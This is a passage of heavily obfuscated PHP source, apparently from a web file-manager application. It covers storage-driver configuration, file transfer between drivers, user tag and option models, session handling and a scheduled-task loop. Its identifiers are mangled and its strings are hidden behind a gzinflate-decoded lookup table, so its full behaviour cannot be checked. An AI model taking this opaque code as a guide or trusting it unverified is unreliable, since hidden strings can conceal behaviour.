bëÆÑ‹Ã‡ø; B–Íô”İÑ„: } public function checkConfig(&$AßÁÌÖš©Ş, $d®ÌªÜÚÎ = false) { goto bŠ‘íÜˆÑò; D—÷ŠãêÜ: foreach ($B¼ó›¥åÜ as $AŒ¹Ñ‰Â’Ã => $AË¢Áò‹¾) { $B¼ó›¥åÜ[$AŒ¹Ñ‰Â’Ã] = trim($AË¢Áò‹¾); } $B¼ó›¥åÜ[$dŒÊõÆÚŞä[2024]] = rand_string(6); $B‹·°ğâ’ = $GLOBALS[$dŒÊõÆÚŞä[6]][$dŒÊõÆÚŞä[88]][$dŒÊõÆÚŞä[817]]; goto e¶ƒ²±ã®; eÇŸµªÖï‰: $fËâ©ù› = $Fê‡ªÀŸæ÷->getPath($DÍ‘ø©‘áà . $dŒÊõÆÚŞä[1162]); if (!$Fê‡ªÀŸæ÷->mkfile($fËâ©ù›)) { if ($d®ÌªÜÚÎ) { return LNG($dŒÊõÆÚŞä[2028]); } show_json(LNG($dŒÊõÆÚŞä[2028]), !1); } $B¼ó›¥åÜ[$dŒÊõÆÚŞä[1100]] = $DÍ‘ø©‘áà; goto bŞ™İß¡×; bŞ™İß¡×: $AßÁÌÖš©Ş[$dŒÊõÆÚŞä[6]] = json_encode($B¼ó›¥åÜ); $AßÁÌÖš©Ş[$dŒÊõÆÚŞä[94]] = $fåñ‚ê†›; return !0; goto e©Õ×¡²£°; bŠ‘íÜˆÑò: $dŒÊõÆÚŞä =& $_SERVER[›èö’ù¤]; $F¶½´§Ã™â = strtolower($AßÁÌÖš©Ş[$dŒÊõÆÚŞä[94]]); $B¼ó›¥åÜ = json_decode($AßÁÌÖš©Ş[$dŒÊõÆÚŞä[6]], !0); goto D—÷ŠãêÜ; e¶ƒ²±ã®: $fåñ‚ê†› = isset($B‹·°ğâ’[$F¶½´§Ã™â]) ? $B‹·°ğâ’[$F¶½´§Ã™â] : ucfirst($F¶½´§Ã™â); $dÜÛÎÏİŸÌ = $dŒÊõÆÚŞä[72] . $fåñ‚ê†›; if (!$fåñ‚ê†› || !class_exists($dÜÛÎÏİŸÌ)) { if ($d®ÌªÜÚÎ) { return LNG($dŒÊõÆÚŞä[2025]); } write_log(array($dŒÊõÆÚŞä[2026], $AßÁÌÖš©Ş, get_caller_info()), $dŒÊõÆÚŞä[2027]); show_json(LNG($dŒÊõÆÚŞä[2025]), !1, $AßÁÌÖš©Ş); } goto dƒÁö´Î‘Ë; dƒÁö´Î‘Ë: $Fê‡ªÀŸæ÷ = new $dÜÛÎÏİŸÌ($B¼ó›¥åÜ); if (in_array($F¶½´§Ã™â, $Fê‡ªÀŸæ÷->objectDriver)) { if (!$Fê‡ªÀŸæ÷->isBucketCors() && !$Fê‡ªÀŸæ÷->setBucketCors()) { $fİ¼¦è¡ = LNG($dŒÊõÆÚŞä[2028]); $fİ¼¦è¡ .= $dŒÊõÆÚŞä[2029] . LNG($dŒÊõÆÚŞä[2030]); if ($d®ÌªÜÚÎ) { return $fİ¼¦è¡; } show_json($fİ¼¦è¡, !1); } } $DÍ‘ø©‘áà = rtrim($B¼ó›¥åÜ[$dŒÊõÆÚŞä[1100]], $dŒÊõÆÚŞä[8]) . $dŒÊõÆÚŞä[8]; goto eÇŸµªÖï‰; e©Õ×¡²£°: } public function driverListSystem() { $C™¬èÛŞÃ =& $_SERVER[›èö’ù¤]; $b éçÉ£±¤ = parent::listData(); $fÀ¼•ëÛÀé = array(); foreach ($b éçÉ£±¤ as $DÕ“ö‘¤») { unset($DÕ“ö‘¤»[$C™¬èÛŞÃ[194]], $DÕ“ö‘¤»[$C™¬èÛŞÃ[84]]); $DÕ“ö‘¤»[$C™¬èÛŞÃ[6]] = json_decode($DÕ“ö‘¤»[$C™¬èÛŞÃ[6]], !0); $fÀ¼•ëÛÀé[] = $DÕ“ö‘¤»; } return $fÀ¼•ëÛÀé; } public function defaultDriver() { $c•‡§†ñÓ£ =& $_SERVER[›èö’ù¤]; $b‘á·Íïğé = parent::listData(); $aÅ¯¼öÕÙá = array_filter_by_field($b‘á·Íïğé, $c•‡§†ñÓ£[34], 1); $aÅ¯¼öÕÙá = $aÅ¯¼öÕÙá[0]; if ($aÅ¯¼öÕÙá) { $aÅ¯¼öÕÙá[$c•‡§†ñÓ£[6]] = json_decode($aÅ¯¼öÕÙá[$c•‡§†ñÓ£[6]], !0); } return $aÅ¯¼öÕÙá; } public function driverInfo($dÂ¶Ü³¡‘ê) { $A¢ææĞ—¥İ =& $_SERVER[›èö’ù¤]; $F †‹ÊÙ© = array_to_keyvalue(parent::listData(), $A¢ææĞ—¥İ[395]); if (!isset($F †‹ÊÙ©[$dÂ¶Ü³¡‘ê])) { return !1; } $EİÔ¶â­Âõ = $F †‹ÊÙ©[$dÂ¶Ü³¡‘ê]; $EİÔ¶â­Âõ[$A¢ææĞ—¥İ[6]] = json_decode($EİÔ¶â­Âõ[$A¢ææĞ—¥İ[6]], !0); return $EİÔ¶â­Âõ; } public function remove($Eå†©Ê†Áˆ) { $this->removeShareItems($Eå†©Ê†Áˆ); return parent::remove($Eå†©Ê†Áˆ); } public function removeWithFile($d³ÌÇ··…, $Bõ†ËĞóô°) { goto a–ïÍ•´ø; bø‘® ñâ: $A°è™ƒåŒç = "\x7b\151\x6f\x3a{$cÀ¦îˆÆ£ó}\x7d\x2f"; $A¦øòÁ½Ó² = !0; $F’¬·›ˆë¸ = array(); goto FïÈÀÓï; bª—í‰Š’Ó: $E¾ØÇ„ ½->task[$fÖŸâ™Õõ—[747]] = (double) $E³™ïÖÁÅ; $cê¨¤¬Å§¸ = KodIO::defaultDriver(); $cÀ¦îˆÆ£ó = $cê¨¤¬Å§¸[$fÖŸâ™Õõ—[395]]; goto bø‘® ñâ; dˆäôòÌ“: $E³™ïÖÁÅ = Model($fÖŸâ™Õõ—[465])->where($b‰Éé¨ê§ß)->sum($fÖŸâ™Õõ—[78]); $c™òôæ¬ = $Bõ†ËĞóô° . $fÖŸâ™Õõ—[2031] . $d³ÌÇ··…; $E¾ØÇ„ ½ = new TaskFileTransfer($c™òôæ¬, $fÖŸâ™Õõ—[2027], $DÀÖˆÎÅ, LNG($fÖŸâ™Õõ—[2032]) . "\50{$d³ÌÇ··…}\51"); goto bª—í‰Š’Ó; aùÆ†„´Ÿ: if (!$A¦øòÁ½Ó²) { $E¾ØÇ„ ½->stop($c™òôæ¬); return !1; } $E¾ØÇ„ ½->end(); if ($Bõ†ËĞóô° == $fÖŸâ™Õõ—[1686]) { $this->remove($d³ÌÇ··…); } goto AÙÏÁôå‰ã; FïÈÀÓï: $F÷¼¿„Ç¢ = Model($fÖŸâ™Õõ—[193])->where($b‰Éé¨ê§ß)->field($fÖŸâ™Õõ—[2033])->select(); foreach ($F÷¼¿„Ç¢ as $FÖÕ³Ô†®Ñ) { goto e¬ñÃË¯²Ò; E®ƒº„Ïõ: if (IO::exist($D£Â¿ŒÖÓ)) { $E¾ØÇ„ ½->updateFileEnd($FÖÕ³Ô†®Ñ[$fÖŸâ™Õõ—[28]], $FÖÕ³Ô†®Ñ[$fÖŸâ™Õõ—[78]]); continue; } if (!IO::move($EÓ³«‹Åˆ, get_path_father($D£Â¿ŒÖÓ))) { $A¦øòÁ½Ó² = !1; break; } $b‰Éé¨ê§ß = array($fÖŸâ™Õõ—[462] => $FÖÕ³Ô†®Ñ[$fÖŸâ™Õõ—[462]]); goto bËºİ§†’Ÿ; e¬ñÃË¯²Ò: $EÓ³«‹Åˆ = $FÖÕ³Ô†®Ñ[$fÖŸâ™Õõ—[76]]; $D£Â¿ŒÖÓ = $A°è™ƒåŒç . str_replace("\173\151\x6f\72{$d³ÌÇ··…}\175\57", $fÖŸâ™Õõ—[33], $EÓ³«‹Åˆ); if (!IO::exist($EÓ³«‹Åˆ)) { $F’¬·›ˆë¸[] = $FÖÕ³Ô†®Ñ[$fÖŸâ™Õõ—[462]]; $E¾ØÇ„ ½->updateFileEnd($FÖÕ³Ô†®Ñ[$fÖŸâ™Õõ—[28]], $FÖÕ³Ô†®Ñ[$fÖŸâ™Õõ—[78]]); continue; } goto E®ƒº„Ïõ; bËºİ§†’Ÿ: $BÚ÷©ô–‚‹ = array($fÖŸâ™Õõ—[808] => $cÀ¦îˆÆ£ó, $fÖŸâ™Õõ—[76] => $D£Â¿ŒÖÓ); Model($fÖŸâ™Õõ—[193])->where($b‰Éé¨ê§ß)->save($BÚ÷©ô–‚‹); goto E—×ö¹Õ²İ; E—×ö¹Õ²İ: } $this->removeByFileID($F’¬·›ˆë¸); goto aùÆ†„´Ÿ; a–ïÍ•´ø: $fÖŸâ™Õõ— =& $_SERVER[›èö’ù¤]; $b‰Éé¨ê§ß = array($fÖŸâ™Õõ—[808] => $d³ÌÇ··…); $DÀÖˆÎÅ = Model($fÖŸâ™Õõ—[465])->where($b‰Éé¨ê§ß)->count(); goto dˆäôòÌ“; AÙÏÁôå‰ã: } public function progress($c»«¼•×Ú, $C»¸Æø²†) { return Task::get($C»¸Æø²† . $_SERVER[›èö’ù¤][2031] . $c»«¼•×Ú); } private function removeByFileID($a¥¾ó²İÏ™ = array()) { goto E§Ú¯¼Å“®; fï‡ã¶‘–ã: foreach ($Aš¦ô•„“Ì as $E¨¡ŠçÒÂÌ) { Model($BâñÈ·Ô™Ù[411])->removeNow($E¨¡ŠçÒÂÌ, !1); } goto AÒ‡õê³; E§Ú¯¼Å“®: $BâñÈ·Ô™Ù =& $_SERVER[›èö’ù¤]; if (empty($a¥¾ó²İÏ™)) { return; } $c•ÜÓÖÉ‡­ = array($BâñÈ·Ô™Ù[462] => array($BâñÈ·Ô™Ù[7], $a¥¾ó²İÏ™)); goto bÑÃ­ÉˆÁ‚; bÑÃ­ÉˆÁ‚: $Aš¦ô•„“Ì = Model($BâñÈ·Ô™Ù[1230])->where($c•ÜÓÖÉ‡­)->field($BâñÈ·Ô™Ù[397])->select(); if (!$Aš¦ô•„“Ì) { return; } $Aš¦ô•„“Ì = array_to_keyvalue($Aš¦ô•„“Ì, $BâñÈ·Ô™Ù[33], $BâñÈ·Ô™Ù[397]); goto fï‡ã¶‘–ã; AÒ‡õê³: } private function removeShareItems($B‰²¸‘äã) { goto F°êÏºß°â; A´À®äá‰: $bÕ“‹£Ù·— = Model($F¬‚ê¥‘™Æ[1697])->where($eĞ£¡Ê·ĞÁ)->field($F¬‚ê¥‘™Æ[483])->select(); if (empty($bÕ“‹£Ù·—)) { return; } $bšßÈ¾Å‹ = array_to_keyvalue($bÕ“‹£Ù·—, $F¬‚ê¥‘™Æ[33], $F¬‚ê¥‘™Æ[483]); goto F¡êÏâšÕ–; F¡êÏâšÕ–: Model($F¬‚ê¥‘™Æ[590])->remove($bšßÈ¾Å‹); goto FÉÈŞÃ›—®; F°êÏºß°â: $F¬‚ê¥‘™Æ =& $_SERVER[›èö’ù¤]; $C÷‚³åÓ‰± = "\x7b\151\157\x3a{$B‰²¸‘äã}\x7d\57"; $eĞ£¡Ê·ĞÁ = array($F¬‚ê¥‘™Æ[397] => 0, $F¬‚ê¥‘™Æ[1095] => array($F¬‚ê¥‘™Æ[381], "{$C÷‚³åÓ‰±}\x25")); goto A´À®äá‰; FÉÈŞÃ›—®: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\56\x4c\x69\x67\150\164\x41\160\160"; public $modelType = "\x53\x79\x73\x74\x65\155\x4f\x70\x74\151\x6f\156"; public $field = array("\156\141\155\x65", "\x67\162\157\x75\160", "\x64\x65\163\143", "\x63\x6f\x6e\164\145\x6e\164"); public function listData($CáÈğ”—ò¾ = false, $c«¹ËÂ ó = "\x6d\x6f\144\151\146\171\x54\x69\x6d\145", $fÔ£Úğ¾ = true) { return parent::listData($CáÈğ”—ò¾, $c«¹ËÂ ó, $fÔ£Úğ¾); } public function remove($Fšø„ÛğÃš) { $a“®³ÏÅ˜à = $this->findByName($Fšø„ÛğÃš); if (!$a“®³ÏÅ˜à) { return !1; } return parent::remove($a“®³ÏÅ˜à[$_SERVER[›èö’ù¤][395]]); } public function add($F“‡ğ Ç²š) { if ($this->findByName($F“‡ğ Ç²š[$_SERVER[›èö’ù¤][28]])) { return !1; } return parent::insert($F“‡ğ Ç²š); } public function update($BŸ¿îèŠñ¸, $d£ä³’¦ƒ») { $eÕ‹™ÊëØ =& $_SERVER[›èö’ù¤]; $f’ˆÎ²¾®® = $this->findByName($BŸ¿îèŠñ¸); $D…çé÷­¥© = $this->findByName($d£ä³’¦ƒ»[$eÕ‹™ÊëØ[28]]); if (!$f’ˆÎ²¾®® || $D…çé÷­¥© && $D…çé÷­¥©[$eÕ‹™ÊëØ[395]] != $f’ˆÎ²¾®®[$eÕ‹™ÊëØ[395]]) { return !1; } return parent::update($f’ˆÎ²¾®®[$eÕ‹™ÊëØ[395]], $d£ä³’¦ƒ»); } } goto A—¶î„òÄ¶; a­Ğ—–Ë¡Õ: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\x72\x5f\x6f\160\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($dóìøÏ÷ÏÉ) { $fùÃ–©ç =& $_SERVER[›èö’ù¤]; if (!defined($fùÃ–©ç[469])) { define($fùÃ–©ç[469], 0); } return "\125\163\145\x72\x4f\160\x74\x69\157\x6e\137{$dóìøÏ÷ÏÉ}\137" . USER_ID; } protected function filterWhere($f¹¶‹Óè…) { $DæÓòÏšóÃ =& $_SERVER[›èö’ù¤]; if (!defined($DæÓòÏšóÃ[469])) { define($DæÓòÏšóÃ[469], 0); } $f¹¶‹Óè…[$DæÓòÏšóÃ[1551]] = USER_ID; return $f¹¶‹Óè…; } public function cacheRemoveUser($f¥Ç“Öó™, $AÓ¿¼¼Ñ¦›) { return Cache::remove("\125\x73\145\x72\117\160\164\x69\157\156\x5f{$f¥Ç“Öó™}\x5f" . $AÓ¿¼¼Ñ¦›); } protected function optionDefault($F‹´õÒ¤æ† = '') { $a§³ä¿× =& $_SERVER[›èö’ù¤]; if ($F‹´õÒ¤æ† == $a§³ä¿×[33]) { return $GLOBALS[$a§³ä¿×[6]][$a§³ä¿×[2192]]; } if ($F‹´õÒ¤æ† == $a§³ä¿×[2193]) { return $GLOBALS[$a§³ä¿×[6]][$a§³ä¿×[2194]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\x72\x2e\164\141\x67\114\151\x73\x74"; public $modelType = "\125\x73\145\162\117\160\164\x69\x6f\x6e"; public $field = array("\156\x61\x6d\145", "\163\164\x79\154\145", "\x73\157\x72\x74"); public function listData($C‡ÀòŠÀ = false, $c‚À–á–Ô‰ = "\163\157\162\x74", $Fªã•ĞŞ™ê = false) { return parent::listData($C‡ÀòŠÀ, $c‚À–á–Ô‰, $Fªã•ĞŞ™ê); } public function remove($FÀòƒ¹Ÿ¿) { return parent::remove($FÀòƒ¹Ÿ¿); } public function add($AíĞ¿¢š—Û, $Eƒ„¥Áìš‚ = "\154\x61\x62\145\154\55\x67\x72\145\171\55\x6e\x6f\x72\x6d\x61\154") { $bßêšÙ­œ™ =& $_SERVER[›èö’ù¤]; if ($this->findByName($AíĞ¿¢š—Û)) { return !1; } $Eõ…À®ÙĞ = array($bßêšÙ­œ™[415] => $AíĞ¿¢š—Û, $bßêšÙ­œ™[479] => $Eƒ„¥Áìš‚, $bßêšÙ­œ™[1724] => $this->getSort($bßêšÙ­œ™[256]) + 1); return parent::insert($Eõ…À®ÙĞ); } public function update($Ašµ¨…Êå, $E®†¼æš×õ) { $D­èË‘¸©ˆ =& $_SERVER[›èö’ù¤]; $e±ÈÙƒ‡øØ = $this->listData($Ašµ¨…Êå); $AÆ•¸ŸˆØ = $this->findByName($E®†¼æš×õ[$D­èË‘¸©ˆ[28]]); if (!$e±ÈÙƒ‡øØ || $AÆ•¸ŸˆØ && $AÆ•¸ŸˆØ[$D­èË‘¸©ˆ[395]] != $e±ÈÙƒ‡øØ[$D­èË‘¸©ˆ[395]]) { return !1; } return parent::update($Ašµ¨…Êå, $E®†¼æš×õ); } public function moveTop($Dö¥º©Ì‰ï) { $Dâ˜Ì‡Ï¦„ =& $_SERVER[›èö’ù¤]; $dãõ×¦é®™ = parent::listData(); $E¿Ì¨Ìƒƒ = $this->getSort($Dâ˜Ì‡Ï¦„[255]); foreach ($dãõ×¦é®™ as &$D×àÔ‡öÜì) { if ($D×àÔ‡öÜì[$Dâ˜Ì‡Ï¦„[395]] == $Dö¥º©Ì‰ï) { $D×àÔ‡öÜì[$Dâ˜Ì‡Ï¦„[1743]] = $E¿Ì¨Ìƒƒ; continue; } $D×àÔ‡öÜì[$Dâ˜Ì‡Ï¦„[1743]] += 1; } unset($D×àÔ‡öÜì); return parent::resetData($dãõ×¦é®™); } public function moveBottom($BÆ¹ƒóÃò) { $aÇ˜Ø’´¼Ö =& $_SERVER[›èö’ù¤]; $A´‹…¸ëè = $this->getSort($aÇ˜Ø’´¼Ö[256]) + 1; return parent::update($BÆ¹ƒóÃò, array($aÇ˜Ø’´¼Ö[1743] => $A´‹…¸ëè)); } public function resetSort($A”Êï¤ĞÃ) { goto bğ ÇÂ¾òŞ; bğ ÇÂ¾òŞ: $B—ïŠæ¥‚ =& $_SERVER[›èö’ù¤]; $E¦ğ„ğÚŸ = array(); $A”Êï¤ĞÃ = is_array($A”Êï¤ĞÃ) ? $A”Êï¤ĞÃ : array(); goto fµšÓ‘µ”ï; bº§êô©§Î: unset($bÉ™ Óæî); return parent::resetData($aÎï…ãÙ´¢); goto cïÚÍ­ŒÇ; fµšÓ‘µ”ï: for ($cœ×İÌè‰¾ = 0; $cœ×İÌè‰¾ < count($A”Êï¤ĞÃ); $cœ×İÌè‰¾++) { $E¦ğ„ğÚŸ[$A”Êï¤ĞÃ[$cœ×İÌè‰¾] . $B—ïŠæ¥‚[33]] = $cœ×İÌè‰¾ + 1; } $aÎï…ãÙ´¢ = parent::listData(); foreach ($aÎï…ãÙ´¢ as &$bÉ™ Óæî) { $a¨äô§…ÄØ = $E¦ğ„ğÚŸ[$bÉ™ Óæî[$B—ïŠæ¥‚[395]]]; $bÉ™ Óæî[$B—ïŠæ¥‚[1743]] = $a¨äô§…ÄØ ? $a¨äô§…ÄØ : $bÉ™ Óæî[$B—ïŠæ¥‚[1743]]; } goto bº§êô©§Î; cïÚÍ­ŒÇ: } private function getSort($F’øó·î½Õ) { $B†ŒÒ›ƒŒ¬ =& $_SERVER[›èö’ù¤]; $e½ê›¤™Š = parent::listData(); $c¥·¤‚ìá = array_to_keyvalue($e½ê›¤™Š, $B†ŒÒ›ƒŒ¬[33], $B†ŒÒ›ƒŒ¬[1743]); if (!$c¥·¤‚ìá) { $c¥·¤‚ìá = array(0); } $f„ß×ªœ­ = $F’øó·î½Õ == $B†ŒÒ›ƒŒ¬[256] ? max($c¥·¤‚ìá) : min($c¥·¤‚ìá); return intval($f„ß×ªœ­); } } goto CÓ³£â™à¿; A“‚Å…ìë¬: define($_SERVER[›èö’ù¤][0], $_SERVER[›èö’ù¤][1]); $_SERVER[»½§Ó„] = explode($_SERVER[›èö’ù¤][2], gzinflate(substr($_SERVER[›èö’ù¤][3], 10, -8))); function binCheckEq($e®Ü´ÎÃ, $fÔ¼ßŠÙä) { return $e®Ü´ÎÃ == $fÔ¼ßŠÙä; } goto DùÃæ¾Ê†Å; b•æÎ®—ÓĞ: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto EğÀŞÅËìƒ; e¸…®İƒ—: $CÇ ¶±˜Ù = $GLOBALS[$B°Ÿ‰ Ş´‡[6]][$B°Ÿ‰ Ş´‡[347]]; self::$sessionTime = $CÇ ¶±˜Ù[$B°Ÿ‰ Ş´‡[1510]]; $AÉìÊ‡½Ä† = isset($GLOBALS[$B°Ÿ‰ Ş´‡[1511]]) ? $GLOBALS[$B°Ÿ‰ Ş´‡[1511]] : SESSION_ID; goto få±Ê›ïà; få±Ê›ïà: if (self::$sessionSign) { } else { if (Cookie::get($AÉìÊ‡½Ä†)) { self::$sessionSign = Cookie::get($AÉìÊ‡½Ä†); } else { self::$sessionSign = guid(); } } Cookie::setSafe($AÉìÊ‡½Ä†, self::$sessionSign, self::$sessionTime); $C†›„îÈ¹ö = $CÇ ¶±˜Ù[$B°Ÿ‰ Ş´‡[1512]]; goto a²ŠÙªÉ‡…; FïîÉ…˜¨Õ: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $E’ÖíŠÏ› = new self(); return $E’ÖíŠÏ›; goto AïÀöŒ˜×; a²ŠÙªÉ‡…: $C•ÀÙÂŠ½µ = $CÇ ¶±˜Ù[$C†›„îÈ¹ö]; $f‘Âƒ¾†òŞ = $CÇ ¶±˜Ù[$B°Ÿ‰ Ş´‡[819]]; switch ($C†›„îÈ¹ö) { case $B°Ÿ‰ Ş´‡[17]: self::$handle = Model($B°Ÿ‰ Ş´‡[820]); break; case $B°Ÿ‰ Ş´‡[821]: self::$handle = new CacheRedis($C•ÀÙÂŠ½µ, $f‘Âƒ¾†òŞ); break; case $B°Ÿ‰ Ş´‡[822]: self::$handle = new CacheMemcached($C•ÀÙÂŠ½µ, $f‘Âƒ¾†òŞ); break; case $B°Ÿ‰ Ş´‡[193]: $C•ÀÙÂŠ½µ[$B°Ÿ‰ Ş´‡[76]] = $C•ÀÙÂŠ½µ[$B°Ÿ‰ Ş´‡[76]] . $B°Ÿ‰ Ş´‡[1513]; self::$handle = new CacheFile($C•ÀÙÂŠ½µ, $f‘Âƒ¾†òŞ); default: break; } goto FïîÉ…˜¨Õ; EğÀŞÅËìƒ: $B°Ÿ‰ Ş´‡ =& $_SERVER[›èö’ù¤]; static $E’ÖíŠÏ› = false; if ($E’ÖíŠÏ›) { return $E’ÖíŠÏ›; } goto e¸…®İƒ—; AïÀöŒ˜×: } public static function sign($eº·–ˆ‹“­ = false) { $eº·–ˆ‹“­ && (self::$sessionSign = $eº·–ˆ‹“­); self::init(); return self::$sessionSign; } public static function set($AóŒ”×½ô, $FÔÑêóÛ‚İ = false) { self::init(); if (is_array($AóŒ”×½ô)) { foreach ($AóŒ”×½ô as $Dã®‚ àâÓ => $bÁ²óß) { array_set_value(self::$data, $Dã®‚ àâÓ, $bÁ²óß); } } else { array_set_value(self::$data, $AóŒ”×½ô, $FÔÑêóÛ‚İ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($Có°°ùˆ› = false) { self::init(); if (!$Có°°ùˆ›) { return self::$data; } return array_get_value(self::$data, $Có°°ùˆ›); } public static function remove($eŸ¼¢óÃÇñ) { self::init(); unset(self::$data[$eŸ¼¢óÃÇñ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[›èö’ù¤][824])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto d‡Œæ´äí…; CÈç»ÌƒÆğ: while (!0) { self::cacheClear(); if (self::valueGet($D¥¥êŸöÈˆ[734]) != $D¥¥êŸöÈˆ[87]) { self::valueSet($D¥¥êŸöÈˆ[1514], $D¥¥êŸöÈˆ[191]); self::log($D¥¥êŸöÈˆ[1518]); die; } self::valueSet($D¥¥êŸöÈˆ[1514], $D¥¥êŸöÈˆ[87]); self::valueSet($D¥¥êŸöÈˆ[1515], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto b»ÕšÅ–‹Ä; d‡Œæ´äí…: $D¥¥êŸöÈˆ =& $_SERVER[›èö’ù¤]; if (self::valueGet($D¥¥êŸöÈˆ[734]) != $D¥¥êŸöÈˆ[87]) { return; } if (self::valueGet($D¥¥êŸöÈˆ[1514]) == $D¥¥êŸöÈˆ[87]) { $aæ«Şº×ŒŠ = self::valueGet($D¥¥êŸöÈˆ[1515]); if (time() - $aæ«Şº×ŒŠ > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto e‹§øœ˜ÁÔ; e‹§øœ˜ÁÔ: http_close(); self::valueSet($D¥¥êŸöÈˆ[1514], $D¥¥êŸöÈˆ[87]); Hook::bind($D¥¥êŸöÈˆ[1516], $D¥¥êŸöÈˆ[1517]); goto CÈç»ÌƒÆğ; b»ÕšÅ–‹Ä: } public static function restart() { $cºº‰¬áŞ‰ =& $_SERVER[›èö’ù¤]; http_close(); self::valueSet($cºº‰¬áŞ‰[734], $cºº‰¬áŞ‰[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($cºº‰¬áŞ‰[1514], $cºº‰¬áŞ‰[191]); self::valueSet($cºº‰¬áŞ‰[734], $cºº‰¬áŞ‰[87]); } public static function shutdownEvent() { $cÆ…„Å×Ÿ =& $_SERVER[›èö’ù¤]; self::valueSet($cÆ…„Å×Ÿ[1514], $cÆ…„Å×Ÿ[191]); self::log($cÆ…„Å×Ÿ[1519]); } public static function config($E©¹…áí‡³, $aÙØÆ®Ò‰µ) { self::valueSet($_SERVER[›èö’ù¤][734], $E©¹…áí‡³); } private static function taskRunAll() { goto fíõâ¾Ò‚; Dç›¦‹çë©: self::taskQueueRun($fÓÎÀÂ—›£); goto C¢İ²œËùƒ; fíõâ¾Ò‚: $FÓÃÓàÛä» =& $_SERVER[›èö’ù¤]; $fÓÎÀÂ—›£ = timeFloat(); $d Ó½…“   = Model($FÓÃÓàÛä»[1520])->listData(); goto e×‚œ¦Ã×Ù; e×‚œ¦Ã×Ù: $Fªå­‘¼§ª = count($d Ó½…“  ); for ($f”ÂÉ„½§ = 0; $f”ÂÉ„½§ < $Fªå­‘¼§ª; $f”ÂÉ„½§++) { $cÆ£ò¬¸§¦ = $d Ó½…“  [$f”ÂÉ„½§]; if (!$cÆ£ò¬¸§¦[$FÓÃÓàÛä»[395]] || $cÆ£ò¬¸§¦[$FÓÃÓàÛä»[1521]] != $FÓÃÓàÛä»[87]) { continue; } if (!self::taskTimeCheck($cÆ£ò¬¸§¦)) { continue; } self::taskRun($cÆ£ò¬¸§¦); } Hook::trigger($FÓÃÓàÛä»[1522]); goto Dç›¦‹çë©; C¢İ²œËùƒ: } private static function taskQueueRun($E‚çË³Ö¨) { $B–İÜ¯›• = 10; while (!0) { $C™ëÒ×åñŠ = TaskQueue::run(); if ($C™ëÒ×åñŠ === !1) { break; } if (timeFloat() - $E‚çË³Ö¨ >= $B–İÜ¯›•) { break; } } } private static function taskTimeCheck($b†ˆïš†ºØ) { goto CŸå³Šß·; CŸå³Šß·: $e­˜Ä¾Šš =& $_SERVER[›èö’ù¤]; $c³´ò“¶¹Õ = json_decode($b†ˆïš†ºØ[$e­˜Ä¾Šš[197]], !0); $B´Ç³ë´ø¸ = intval($b†ˆïš†ºØ[$e­˜Ä¾Šš[1515]]); goto fŠôŞóéÉ¸; fŠôŞóéÉ¸: $C¦à¾ÜÕ”½ = strtotime($e­˜Ä¾Šš[1523] . $c³´ò“¶¹Õ[$e­˜Ä¾Šš[1524]] . $e­˜Ä¾Šš[1525]) - strtotime($e­˜Ä¾Šš[1526]); $e„¦ìÉ£ã´ = time() - strtotime(date($e­˜Ä¾Šš[1527]) . $e­˜Ä¾Šš[1528]); $e‹Û®¬±â = $e„¦ìÉ£ã´ >= $C¦à¾ÜÕ”½ && $e„¦ìÉ£ã´ <= $C¦à¾ÜÕ”½ + 3600; goto f—ë‚ÖÖÏ; f—ë‚ÖÖÏ: switch ($c³´ò“¶¹Õ[$e­˜Ä¾Šš[29]]) { case $e­˜Ä¾Šš[1529]: if (time() - $B´Ç³ë´ø¸ < 3600 * 24 * 30) { return !1; } if ($c³´ò“¶¹Õ[$e­˜Ä¾Šš[1529]] == date($e­˜Ä¾Šš[1530]) && $e‹Û®¬±â) { return !0; } break; case $e­˜Ä¾Šš[1531]: if (time() - $B´Ç³ë´ø¸ < 3600 * 24 * 7) { return !1; } $Bïš‡ß„·÷ = date($e­˜Ä¾Šš[1532]) == 0 ? 7 : date($e­˜Ä¾Šš[1532]); if ($c³´ò“¶¹Õ[$e­˜Ä¾Šš[1531]] == $Bïš‡ß„·÷ && $e‹Û®¬±â) { return !0; } break; case $e­˜Ä¾Šš[1524]: if (time() - $B´Ç³ë´ø¸ < 3600 * 24) { return !1; } if ($e‹Û®¬±â) { return !0; } break; case $e­˜Ä¾Šš[1533]: if (time() - $B´Ç³ë´ø¸ >= floatval($c³´ò“¶¹Õ[$e­˜Ä¾Šš[1533]]) * 60) { return !0; } break; default: break; } return !1; goto cÑ‹¶”†áë; cÑ‹¶”†áë: } private static function closeDatabase() { goto a•İÙ£Œ”¼; CÃì‘Óò«§: $fÑ’Øí†Ë… = Model($Eô‰ÑÛ´[508])->db($Eô‰ÑÛ´[33]); if ($fÑ’Øí†Ë…) { $fÑ’Øí†Ë…->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { write_log($Eô‰ÑÛ´[1534], $Eô‰ÑÛ´[1535]); die; } goto f“Ø—Éğ¢­; EˆŞ‰­§šˆ: if (!$d‚èºËè·–) { $d‚èºËè·– = time(); } if (time() - $d‚èºËè·– < $b»£Ğïœ) { return; } $d‚èºËè·– = time(); goto CÃì‘Óò«§; a•İÙ£Œ”¼: $Eô‰ÑÛ´ =& $_SERVER[›èö’ù¤]; static $d‚èºËè·– = 0; $b»£Ğïœ = 300; goto EˆŞ‰­§šˆ; f“Ø—Éğ¢­: } public static function 